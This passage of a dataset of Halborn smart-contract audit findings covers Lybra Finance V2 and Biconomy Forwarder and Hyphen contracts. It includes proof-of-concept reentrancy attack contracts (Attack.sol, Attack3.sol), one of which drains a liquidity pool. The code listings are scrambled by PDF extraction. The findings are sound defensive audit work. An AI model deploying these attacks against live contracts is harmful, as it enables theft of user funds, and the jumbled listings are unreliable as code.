collateral can be liquidated \"); 29 129 require ( PeUSD . allowance ( provider , address ( this )) != 0 || msg .  sender == provider , \" provider should authorize to provide  liquidation peUSD \" ); 130 131 132 133 134 uint256 peusdAmount = ( assetAmount * assetPrice ) / 1 e18 ; _repay ( provider , onBehalfOf , peusdAmount ); uint256 reducedAsset = assetAmount ; if ( onBehalfOfCollateralRatio > 1 e20 &&  onBehalfOfCollateralRatio < 11 e19 ) { 135 reducedAsset = assetAmount * onBehalfOfCollateralRatio / 1  e20 ; 136 137 138 139 140 141 142 } if ( onBehalfOfCollateralRatio >= 11 e19 ) { reducedAsset = assetAmount * 11 / 10; } depositedAsset [ onBehalfOf ] -= reducedAsset ; uint256 reward2keeper ; uint256 keeperRatio = configurator . vaultKeeperRatio ( address (  this )); 143 if ( msg . sender != provider && onBehalfOfCollateralRatio >= 1  e20 + keeperRatio * 1 e18 ) { 144 145 146 147 reward2keeper = assetAmount * keeperRatio / 100; collateralAsset . safeTransfer ( msg . sender , reward2keeper ); } collateralAsset . safeTransfer ( provider , reducedAsset -  reward2keeper ); 148 emit LiquidationRecord ( provider , msg . sender , onBehalfOf ,  peusdAmount , reducedAsset , reward2keeper , false , block . timestamp ); 149 } The liquidation() function calls internally the _repay() function: Listing 5: LybraPeUSDVaultBase.sol (Lines 204,210) 192 /* * 193 * @notice Burn _provideramount peUSD to payback minted peUSD for  _onBehalfOf . 194 195 * * @dev Refresh LBR reward before reducing providers debt . Refresh  Lybra generated service fee before reducing totalPeUSDCirculation  . */ 196 197 function _repay ( address _provider , address _onBehalfOf , uint256 30  _amount ) internal virtual { 198 199 200 201 configurator . refreshMintReward ( _onBehalfOf ); _updateFee ( _onBehalfOf ); uint256 totalFee = feeStored [ _onBehalfOf ]; uint256 amount = borrowed [ _onBehalfOf ] + totalFee >= _amount ?  _amount : borrowed [ _onBehalfOf ] + totalFee ; 202 203 204 if ( amount > totalFee ) { feeStored [ _onBehalfOf ] = 0; PeUSD . transferFrom ( _provider , address ( configurator ) ,  totalFee ); 205 206 207 208 209 210 PeUSD . burn ( _provider , amount - totalFee ); borrowed [ _onBehalfOf ] -= amount - totalFee ; poolTotalCirculation -= amount - totalFee ; } else { feeStored [ _onBehalfOf ] = totalFee - amount ; PeUSD . transferFrom ( _provider , address ( configurator ) ,  amount ); 211 212 213 214 } } try configurator . distributeRewards () {} catch {} emit Burn ( _provider , _onBehalfOf , amount , block . timestamp ); In order to call the liquidation function, the provider must first approve the Vault contract. Based on this, the normal flow would be: 1. Provider PeUSD approves the Vault. 2. liquidated address>, <liquidated amount>) 3. Provider receives collateralAsset up to a 10% discount. 4. Provider receives reward2keeper fee. Vault.liquidation(<Provider address>, <user Provider calls Although, with the current implementation that allows setting a provider address different from msg.sender, the following attack vector would be possible: 1. Provider PeUSD approves the Vault. 2. liquidated address>, <liquidated amount>) 3. reward2keeper fee. 4. Provider receives collateralAsset up to a 10% discount. 5. Provider transaction reverts as it was frontrun. The liquidation call is frontrun by a MEV bot stealing the Vault.liquidation(<Provider address>, <user Provider calls 31 Note that reward2keeper can be up to 5% as: Listing 6: LybraConfigurator.sol (Line 257) 251 /* * 252 * @notice Set the reward ratio for the liquidator after  liquidation . 253 * @param pool The address of the pool to set the reward ratio for  . 254 * @param newRatio The new reward ratio to set , limited to a  maximum of 5%. */ 255 256 function setKeeperRatio ( address pool , uint256 newRatio ) external  checkRole ( TIMELOCK ) { require ( newRatio <= 5, \" Max Keeper reward is 5% \"); vaultKeeperRatio [ pool ] = newRatio ; emit KeeperRatioChanged ( pool , newRatio ); 257 258 259 260 } BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:M/R:N/S:U (6.2) Recommendation: It is recommended to remove the address provider parameter from the liquidation() function and use always msg.sender as the provider. Remediation Plan: SOLVED: The Lybra Finance team solved the issue. If users decide that others should not use their funds for liquidation they have the option to not authorize an allowance to the storage contract. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 32 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Medium"]}, {"title": "LYBRAGOVERNANCE PROPOSAL CREATION CAN BE DOSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The contract LybraGovernance inherits from GovernorTimelockControl con- tract which inherits itself from the Governor contract. The version 4.9.0 of the Governor contract is vulnerable to an issue whereby front running the creation of a proposal, an attacker can become the proposer and gain the ability to cancel it. The attacker can do this repeatedly to try to prevent a proposal from being proposed at all. Moreover, LybraV2 project dependencies are defined in the package.json file: Listing 7: package.json (Line 14) 1 { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 } \" name \" : \" lybra - protocol \" , \" scripts \" : { \" build \" : \" hardhat compile \", \" test \": \" hardhat test \" } , \" devDependencies \": { \" hardhat \": \" ^2.14.0 \" } , \" dependencies \": { \" @chainlink / contracts \" : \" ^0.6.1 \", \" @layerzerolabs / solidity - examples \": \" ^0.0.12 \" , \" @nomicfoundation / hardhat - toolbox \": \" ^2.0.2 \" , \" @openzeppelin / contracts \" : \" ^4.8.3 \" , \" hardhat - gas - reporter \" : \" ^1.0.9 \" } 33 As the openzeppelin/contracts version used is ^4.8.3, upon installation of the dependencies it is entirely possible to install a vulnerable version, making the LybraGovernance vulnerable to this exploit. References: https://github.com/OpenZeppelin/openzeppelin-contracts/security/ advisories/GHSA-5h3x-9wvq-w4m2 https://www.coinspect.com/openzeppelin-governor-dos/ BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to enforce in the package.json file to use the openzeppelin/contracts version 4.9.1 where this bug is solved. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : d050e08072633dcccd69155a36901c9434dfdb58. 34 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Medium"]}, {"title": "CENTRALIZATION ISSUE: LYBRAGOVERNANCE DEPLOYER HAS DAO AND GOV ROLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the GovernanceTimelock contract, the deployer is directly assigned the DAO and GOV roles: Listing 8: GovernanceTimelock.sol (Lines 19,20) 14 constructor ( uint256 minDelay , address [] memory proposers , address  [] memory executors , address admin ) TimelockController ( minDelay ,  proposers , executors , admin ) { 15 16 17 18 19 20 21 } _setRoleAdmin ( DAO , GOV ); _setRoleAdmin ( TIMELOCK , GOV ); _setRoleAdmin ( ADMIN , GOV ); _grantRole ( DAO , address ( this )); _grantRole ( DAO , msg . sender ); _grantRole ( GOV , msg . sender ); The DAO role and hence the GovernanceTimelock contracts deployer has permissions to do any type of update in the LybraConfigurator contract. This totally defeats the purpose of a DAO, as a single address has permissions to perform any change in the protocol. This presents several concerns: 1. Centralization of Power: The essence of a DAO is to decentralize decision-making and reduce single points of failure or control. By assigning the DAO role to the contracts deployer, a centralized entity gets the power to make significant protocol changes, which contradicts the principles of decentralization. 35 2. Attack Surface Increase: Granting both DAO and GOV roles to a single entity, especially at deployment, amplifies the attack surface. If the deployers private key is compromised, an attacker could make arbitrary changes to the protocol. 3. Loss of Credibility: One of the draws for many users towards DAOs is trust in decentralized governance and decision-making. If users or investors discover that a single entity has the capability to alter the protocol unilaterally, it could lead to a loss of faith in the project, affecting adoption and token value. 4. Potential for Malicious or Accidental Actions: With such permis- sions, even a well-intentioned deployer might inadvertently in- troduce bugs or make changes that are not in the best interest of the community. This poses both security and trust risks. BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:C (6.2) Recommendation: It is recommended to not assign the DAO and GOV roles to the GovernanceTimelock contracts deployer. Remediation Plan: SOLVED: The Lybra Finance team solved the issue by implementing the rec- ommended solution. Commit ID : 77e8bc3664fb1b195fd718c2ce1d49af8530f981. 36 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Medium"]}, {"title": "MISSING STALENESS CHECKS IN THE CHAINLINK.LATESTROUNDDATA(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In multiple contracts, the latestRoundData() function of Chainlink price feeds is called to retrieve the price of different assets. Although, these calls are performed without any kind of staleness checks nor price validation. There are no checks on roundID or timeStamp. If there is a problem with Chainlink starting a new round and finding consensus on the new value for the oracle (e.g. Chainlink nodes abandoning the oracle, chain congestion, vulnerability/attacks on the Chainlink system) consumers of these contracts may continue using obsolete data. the hand, other documentation, On latestRoundData() does not raise an error if no response has been reached, but returns 0, in this case feeding an incorrect price to the contracts. Chainlinks according to Code location: LybraConfigurator.sol - Line 320: (, int price, , , )= eUSDPriceFeed.latestRoundData(); EUSDMiningIncentives.sol - Line 189: (, int etherPrice, , , )= etherPriceFeed.latestRoundData(); - Line 190: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); - Line 267: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); 37 ProtocolRewardsPool.sol - Line 151: (, int lbrPrice, , , )= lbrPriceFeed.latestRoundData(); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:N/S:U (5.0) Recommendation: It is recommended to use Chainlinks latestRoundData() function with checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example: Listing 9: latestRoundData example call (Line 2) 1 uint256 private constant GRACE_PERIOD_TIME = 7200; // 2 hours 2 ( uint80 roundId , int256 price , uint256 startedAt , uint256  updatedAt , uint80 answeredInRound ) = eUSDPriceFeed . latestRoundData  () ; 3 require ( answeredInRound >= roundID , \" Stale price \" ); 4 require ( price > 0, \" invalid price \" ); 5 require ( block . timestamp <= updatedAt + GRACE_PERIOD_TIME , \" Stale  price \" ); If in the case that we are dealing with Price Feeds in Arbitrum, the sequencer state should be validated, ensuring that is up before accepting any price as valid. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 38 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Medium"]}, {"title": "MISSING BURNENABLED MODIFIER IN THE PEUSDMAINNET.CONVERTTOEUSD(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the PeUSDMainnet contract, the modifier burnEnabled ensures that the burning is not paused in the LybraConfigurator contract: Listing 10: PeUSDMainnet.sol (Line 51) 50 modifier burnEnabled () { 51 52 53 } require (! configurator . vaultBurnPaused ( msg . sender ) , \" BPP \" ); _; Although, the function convertToEUSD(), which burns peUSD by calling the _burn() internal function is missing this modifier: Listing 11: PeUSDMainnet.sol (Line 111) 104 /* * 105 106 * @dev Allows users to repay peUSD tokens and retrieve eUSD . * @param peusdAmount The amount of peUSD tokens to burn and  retrieve eUSD . The user 's balance of peUSD tokens must be greater  than or equal to this amount . 107 108 109 * Requirements : * ` peusdAmount ` must be greater than 0. * The user 's ` mintedPeUSD ` must be greater than or equal to `  peusdAmount `. */ 110 111 function convertToEUSD ( uint256 peusdAmount ) external { 112 require ( peusdAmount <= userConvertInfo [ msg . sender ]. mintedPeUSD 39  && peusdAmount != 0, \" PCE \" ); 113 114 _burn ( msg . sender , peusdAmount ); uint256 share = ( userConvertInfo [ msg . sender ].  depositedEUSDShares * peusdAmount ) / userConvertInfo [ msg . sender ].  mintedPeUSD ; 115 116 117 118 userConvertInfo [ msg . sender ]. mintedPeUSD -= peusdAmount ; userConvertInfo [ msg . sender ]. depositedEUSDShares -= share ; EUSD . transferShares ( msg . sender , share ); emit ConvertToEUSD ( msg . sender , peusdAmount , EUSD .  getMintedEUSDByShares ( share ) , block . timestamp ); 119 } Hence, users would still be able to burn peUSD through the usage of this function even if the burning is paused for this vault in the LybraConfigurator contract. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to add the burnEnabled modifier to the PeUSDMainnet. convertToEUSD() function. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 40 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Low"]}, {"title": "MISSING MINTENABLED MODIFIER IN THE PEUSDMAINNET.CONVERTTOPEUSD(", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lybra_Finance_V2_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the PeUSDMainnet contract, the modifier mintEnabled ensures that the minting is not paused in the LybraConfigurator contract: Listing 12: PeUSDMainnet.sol (Line 47) 46 modifier mintEnabled () { 47 48 49 } require (! configurator . vaultMintPaused ( msg . sender ) , \" MPP \" ); _; Although, the function convertToPeUSD(), which mints peUSD by calling the _mint() internal function is missing this modifier: Listing 13: PeUSDMainnet.sol (Line 75) * @param eusdAmount The amount of eUSD to deposit and mint peUSD * @notice Allows the user to deposit eUSD and mint peUSD tokens . * @param user The address of the user who wants to deposit eUSD 70 /* * 71 72  and mint peUSD . It can only be the contract itself or the msg .  sender . 73  tokens . 74 */ 75 function convertToPeUSD ( address user , uint256 eusdAmount ) public { 76 require ( _msgSender () == user || _msgSender () == address ( this ) ,  \" MDM \" ); 77 require ( eusdAmount != 0 , \" ZA \"); 41 require ( success , \" TF \" ); userConvertInfo [ user ]. depositedEUSDShares += EUSD . require ( EUSD . balanceOf ( address ( this )) + eusdAmount <= bool success = EUSD . transferFrom ( user , address ( this ) , 78  configurator . getEUSDMaxLocked () ,\" ESL \" ); 79  eusdAmount ); 80 81  getSharesByMintedEUSD ( eusdAmount ); 82 83 84  timestamp ); 85 } userConvertInfo [ user ]. mintedPeUSD += eusdAmount ; _mint ( user , eusdAmount ); emit ConvertToPeUSD ( msg . sender , eusdAmount , eusdAmount , block . Hence, users would still be able to mint peUSD through the usage of this function even if the minting is paused for this vault in the LybraConfigurator contract. BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:N/Y:N/R:N/S:C (3.1) Recommendation: It is recommended to add the mintEnabled modifier to the PeUSDMainnet. convertToPeUSD() function. Remediation Plan: RISK ACCEPTED: The Lybra Finance team accepted the risk of this finding. 42 4.10 (HAL-10) LYBRARETHVAULT.DEPOSITETHERTOMINT() FUNCTION CALLS MAY REVERT - LOW (2.5) Commit IDs affected: - 90285107de8a6754954c303cd69d97b5fdb4e248 ", "labels": ["Halborn", "Lybra_Finance_V2", "Severity: Informational"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf", "body": "The Owner of the contract is usually the account that deploys the contract. As a result, the Owner can perform some privileged functions. In the ERC20ForwarderImplementationV2.sol, BiconomyForwarderV2.sol, FeeManager .sol and OracleAggregator.sol smart contracts, the renounceOwnership function is used to renounce the Owner permission. Renouncing owner- ship before transferring would result in the contract having no Owner, eliminating the ability to call privileged functions. Code Location: Listing 1: ERC20ForwarderImplementationV2.sol (Line 24) 24 contract ERC20ForwarderImplementationV2 is Initializable ,  OwnableUpgradeable , ForwardRequestTypesV2 { 25 Listing 2: BiconomyForwarderV2.sol (Line 23) 23 contract BiconomyForwarderV2 is ForwardRequestTypesV2 , Ownable { 24 Listing 3: FeeManager.sol (Line 22) 22 contract FeeManager is IFeeManager , Ownable { 23 Listing 4: OracleAggregator.sol (Line 6) 6 contract OracleAggregator is Ownable { 7 12 Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended that the Owner cannot call renounceOwnership without transferring the Ownership to other address first. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this issue. 13 ", "labels": ["Halborn", "Biconomy_Forwarder", "Severity: Low"]}, {"title": "ZERO ADDRESS NOT CHECKED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf", "body": "The function setTokenOracle within the contract OracleAggregator.sol is not verifying the callAddress parameter is not the zero address to avoid having issues retrieving the token price data feed. Code Location: Listing 5: OracleAggregator.sol (Line 22) function setTokenOracle ( address token , address callAddress , 21  uint8 decimals , bytes calldata callData , bool signed ) external  onlyOwner { 22 23 24 25 26 tokensInfo [ token ]. callAddress = callAddress ; tokensInfo [ token ]. decimals = decimals ; tokensInfo [ token ]. callData = callData ; tokensInfo [ token ]. dataSigned = signed ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: When setting an address variable, always ensure the value is not zero. Remediation Plan: SOLVED: The issue was solved in commit ID: 11f8abf0c0b8c26ce7a21972b44d1c91a7c3f756 14 ", "labels": ["Halborn", "Biconomy_Forwarder", "Severity: Informational"]}, {"title": "MISSING EVENTS EMITTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Forwarder_Smart_Contract_Solidity_Audit_Report_Halborn_Final.pdf", "body": "It has been observed that critical functionality is missing emitting event for setFeeManager function within the ERC20ForwarderImplementationV2.sol contract and the setTokenAllowed function within the FeeManager.sol contract. These functions should emit events after completing the transactions. Code Location: Listing 6: ERC20ForwarderImplementationV2.sol 105  { 106 107 108 function setFeeManager ( address _feeManager ) external onlyOwner require ( _feeManager != address (0) , \" ERC20Forwarder : new fee manager can not be a zero  address \" 109 110 111 } ); feeManager = _feeManager ; Listing 7: FeeManager.sol function setTokenAllowed ( address token , bool allowed ) external 97  onlyOwner { 98 99 } allowedTokens [ token ] = allowed ; Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: Consider emitting an event when calling setFeeManager and setTokenAllowed functions. Remediation Plan: SOLVED: The issue was solved in commit ID: 11f8abf0c0b8c26ce7a21972b44d1c91a7c3f756 16 ", "labels": ["Halborn", "Biconomy_Forwarder", "Severity: Informational"]}, {"title": "WRONG FEE CALCULATION LEADS LOSS OF REWARD FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The LiquidityPool contract has claim gas fee mechanism for both ERC20 tokens and Native token. There are two functions to claim gas fee. The first function is withdrawErc20GasFee, used for claiming gas fee for ERC20 tokens. The withdrawNativeGasFee function is used for claiming gas fee for native token. It is impossible to withdraw native gas fees due to wrong fee amount of calculation on withdrawNativeGasFee function. Listing 1: LiquidityPool.sol 1 gasFeeAccumulatedByToken [ NATIVE ] = 0; 2 gasFeeAccumulatedByToken [ NATIVE ] = gasFeeAccumulatedByToken [ NATIVE  ] - _gasFeeAccumulated ; Basically, this function tries to substract _gasFeeAccumulated variable from 0. Therefore, this function will always revert, and native gas fees will remain in the contract. Code Location: Listing 2: LiquidityPool.sol (Lines 386,387) 383 function withdrawNativeGasFee () external onlyOwner whenNotPaused { 384 uint256 _gasFeeAccumulated = gasFeeAccumulated [ NATIVE ][  _msgSender () ]; 385 386 387 require ( _gasFeeAccumulated != 0 , \" Gas Fee earned is 0\" ); gasFeeAccumulatedByToken [ NATIVE ] = 0; gasFeeAccumulatedByToken [ NATIVE ] =  gasFeeAccumulatedByToken [ NATIVE ] - _gasFeeAccumulated ; 388 gasFeeAccumulated [ NATIVE ][ _msgSender () ] = 0; 15 389 bool success = payable ( _msgSender () ). send (  _gasFeeAccumulated ); 390 391 392 require ( success , \" Native Transfer Failed \" ); emit GasFeeWithdraw ( address ( this ) , _msgSender () ,  _gasFeeAccumulated ); 393 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to review this mathematical operation and correct as needed. Remediation Plan: SOLVED: The Biconomy team solved this issue by correcting the math oper- ation that was causing the loss of funds. Commit ID: fab4b8c0a10a3e0185b2a06b10248391837c07de 16 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Critical"]}, {"title": "REENTRANCY LEADS DRAIN OF FUNDS (PRIVILEGED USER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Reentrancy term comes from where a re-entrant procedure can be in- terrupted in the middle of its execution and then safely be called again (re-entered) before its previous invocations complete execution. In So- lidity, Reentrancy vulnerabilities are mostly critical because attackers can steal funds from contracts by exploiting this vulnerability. It has been observed that a malicious owner or malicious liquidity provider can drain all funds from the liquidity pool. Note: The risk level is decreased to Critical from High due to autho- rization level. Steps to Reproduce: 1. Alice (owner) deploys the LiquidityPool contract. 2. Bob (user1) transfer some funds (22 ETH) to LiquidityPool. 3. Carol (user2) transfer more funds (15 ETH) to LiquidityPool. 4. Alice deploys a malicious Attack contract. 5. Alice sets LiquidityProviders address to the attack contact. 6. Alice tries to send (1 ETH) to the attack contract. 7. Attack contract calls LiquidityPools transfer function reentrantly. 8. Attack contract consumes all ETH from LiquidityPool. 9. Alice destructs the Attack contract and gets all ETH. 17 PoC Code: Listing 3: Attack.sol constructor ( address _lpaddress ) public { owner = msg . sender ; lpool = LiquidityPool ( payable ( _lpaddress )) ; modifier onlyOwner () { require ( owner == msg . sender , \" Unauthorized \"); _; } address private owner ; LiquidityPool public lpool ; address private constant NATIVE = 0 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.8.0; 4 import \" ./ LiquidityPool . sol \" ; 5 6 contract Attack { 7 8  xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE ; 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  { 27 28 29 30 31 32 33 34 } } fallback () external payable { selfdestruct ( payable ( owner )) ; return target . balance ; } } } } function destruct () external onlyOwner { if ( address ( lpool ). balance >= 1 ether ){ lpool . transfer ( NATIVE , address ( this ) , 1 ether ); function getBalance ( address target ) public view returns ( uint ) 18 Code Location: Listing 4: LiquidityPool.sol (Line 395) 395 function transfer ( address _tokenAddress , address receiver , uint256  _tokenAmount ) external whenNotPaused onlyLiquidityProviders { 396 397 if ( _tokenAddress == NATIVE ) { require ( address ( this ). balance >= _tokenAmount , \"  ERR__INSUFFICIENT_BALANCE \" ); 398  \" \"); 399 400 401 ( bool success , ) = receiver . call { value : _tokenAmount }( require ( success , \" ERR__NATIVE_TRANSFER_FAILED \"); } else { IERC20Upgradeable baseToken = IERC20Upgradeable (  _tokenAddress ); 402 require ( baseToken . balanceOf ( address ( this )) >=  _tokenAmount , \" ERR__INSUFFICIENT_BALANCE \"); 403 SafeERC20Upgradeable . safeTransfer ( baseToken , receiver ,  _tokenAmount ); 404 405 } } 19 Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to use nonReentrant modifier on transfer() function. Remediation Plan: SOLVED: The Biconomy team solved this issue by implementing nonReentrant modifier to the transfer() function. Commit ID: e00937d1ca0e800e69fcb87d0841a74c0083194a 20 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: High"]}, {"title": "DIVISION BY ZERO BLOCKS TRANSFER OF FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The sendFundsToUser() is a function on the LiquidityPool contract that allows users to be paid in certain tokens for the specified chainIds. This function is only callable by executors. When an executor attempts to call this function, the following functions are also called sequentially: 1. sendFundsToUser() 2. getAmountToTransfer() 3. getTransferFee() In the last function, there is missing control for if denominator value is zero. There are some conditions that make the denominator be zero. For example; 1. If providedLiquidity and resultingLiquidity variables are zero. (if there is no liquidity on the pool) 2. When you try to send all liquidity to another user while providedLiq- uidity is zero. (if users made a direct transfer to the pool) 3. If maxFee equals to equilibriumFee and providedLiquidity variable is zero. As a result, these circumstances will block transfer of funds. 21 Code Location: Listing 5: LiquidityPool.sol (Line 358) 346 function getTransferFee ( address tokenAddress , uint256 amount )  public view returns ( uint256 fee ) { 347 uint256 currentLiquidity = getCurrentLiquidity (  tokenAddress ); 348 uint256 providedLiquidity = liquidityProviders .  getSuppliedLiquidityByToken ( tokenAddress ); 349 350 351 352 uint256 resultingLiquidity = currentLiquidity - amount ; uint256 equilibriumFee = tokenManager . getTokensInfo (  tokenAddress ). equilibriumFee ; 353 uint256 maxFee = tokenManager . getTokensInfo ( tokenAddress ).  maxFee ; 354 // Fee is represented in basis points * 10 for better  accuracy 355 uint256 numerator = providedLiquidity * equilibriumFee *  maxFee ; // F ( max ) * F( e ) * L ( e) 356 uint256 denominator = equilibriumFee * providedLiquidity +  ( maxFee - equilibriumFee ) * resultingLiquidity ; // F ( e) * L (e ) +  ( F( max ) - F ( e) ) * L( r) 357 358 359 } fee = numerator / denominator ; 22 Recommendation: It is recommended to implement additional check if denominator is equal to zero. For example; Listing 6: Possible Fix fee = numerator / denominator ; 1 if ( denominator > 0) { 2 3 } 4 else { 5 6 } fee = 0; Remediation Plan: SOLVED: The Biconomy team solved this finding by applying the recommen- dation above to the code that was causing the division by zero. Commit ID: 22618c038df5d27368ccac4c5451d2a0c9816513 23 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Medium"]}, {"title": "REENTRANCY ON LPTOKEN MINTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The LPToken contract is ERC721 token and uses tokenMetadata to keep de- posit amounts for other ERC20 tokens. When a user deposit native asset or ERC20 token to the Liquidity Pool over LiquidityProviders contract, LPToken is getting minted to track this operation. During this process, LiquidityProvider contract calls lptoken.mint() function and LPToken con- tract calls ERC721s _safeMint() function. The _safeMint() function has any callbacks, and malicious contract with onERC721Received callback can re-enter to other contracts. This can lead to unexpected situations. PoC Code: Note: The following code does not mint unlimited LPTokens with 1 ETH. It is just added to show that Re-entrancy is possible. However, this situation may produce unexpected results. Listing 7: Attack3.sol (Line 16) LiquidityProviders public liquidityproviders ; 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity 0.8.0; 4 import \" ./ LiquidityProviders . sol \"; 5 import \" @openzeppelin / contracts - upgradeable / token / ERC721 /  IERC721ReceiverUpgradeable . sol \" ; 6 7 contract Attack3 is IERC721ReceiverUpgradeable { 8 9 10 11 12 13 14 15 16 17 function onERC721Received ( address operator , constructor () public {} function setLProvider ( address _lproviders ) external { liquidityproviders = LiquidityProviders ( payable ( _lproviders )); } 24 address from , uint256 tokenId , bytes calldata data ) external override returns ( bytes4 ) { if ( tokenId < 10) { liquidityproviders . addNativeLiquidity { value : 1 e12 }() ; return IERC721ReceiverUpgradeable . onERC721Received . return IERC721ReceiverUpgradeable . onERC721Received . receive () external payable {} function attack () external payable { liquidityproviders . addNativeLiquidity { value : msg . value }() ; 18 19 20 21 22 23  selector ; } 24 25 else { 26  selector ; } 27 28 29 30 31 32 33 34 35 } } } 25 Code Location: Listing 8: LPToken.sol (Line 65) 63 function mint ( address _to ) external onlyHyphenPools whenNotPaused  returns ( uint256 ) { 64 65 66 67 uint256 tokenId = totalSupply () + 1; _safeMint ( _to , tokenId ); return tokenId ; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to implement nonReentrant modifier to the mint function. Other workarond is using _mint function that does not have callback instead of _safeMint function. Remediation Plan: SOLVED: nonReentrant modifier to the mint() function. Biconomy team solved this The issue by implementing the Commit ID: cce62223d4779792ea68f3570b576da12dc96eb2 26 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Medium"]}, {"title": "LACK OF ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Hyphen contracts have address fields on multiple functions. These func- tions have missing address validations. Every address should be validated and checked that is different from zero. This is also considered a best practice. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 9: Functions with missing zero address checks 1 LPToken . setLiquidtyPool ( address ). _lpm 2 LPToken . updateLiquidityPoolAddress ( address ). _liquidityPoolAddress 3 LiquidityPool . transfer ( address , address , uint256 ). receiver Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: This issue solved by Biconomy team after adding additional zero address checks to the code as it recommended. 27 Commit ID: 5c57ae6eddcddde2f89ed00d9c5387ff151774ea 28 ", "labels": ["Halborn", "Biconomy_Hyphen_V2", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Hyphen_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Note: This issue is created for other functions that were not exploited. Code Location: Listing 10: Possible Vulnerable Functions 1 LiquidityPool . depositErc20 () 2 LiquidityPool . depositNative () 3 LiquidityPool . getAmountToTransfer () 4 LiquidityPool . withdrawErc20GasFee () 5 LiquidityPool . withdrawNativeGasFee () 6 LiquidityPool . transfer () 7 LiquidityProviders . addNativeLiquidity () 8 LiquidityProviders . addTokenLiquidity () 9 LiquidityProviders . increaseTokenLiquidity () 10 LiquidityProviders . increaseNativeLiquidity () 11 